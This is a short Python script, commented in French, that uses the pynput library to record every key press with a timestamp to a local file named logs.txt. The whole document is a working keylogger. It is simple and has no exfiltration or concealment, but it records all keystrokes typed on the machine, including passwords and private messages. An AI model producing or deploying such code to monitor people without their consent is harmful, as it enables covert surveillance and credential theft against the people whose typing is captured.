#! /usr/bin/python3

from pynput.keyboard import Key, Listener
import logging #pour les touches
import time

#Configurations des journaux 
logging.basicConfig(filename="logs.txt", level=logging.DEBUG, format='%(asctime)s : %(message)s')

#S'exécute dès qu'une touche est activée
def key_activated(touche) :
	logging.debug(touche)
	
#Dès que une touche est pressé la fonction est exécutée
with Listener(on_press = key_activated) as thread :
	thread.join()
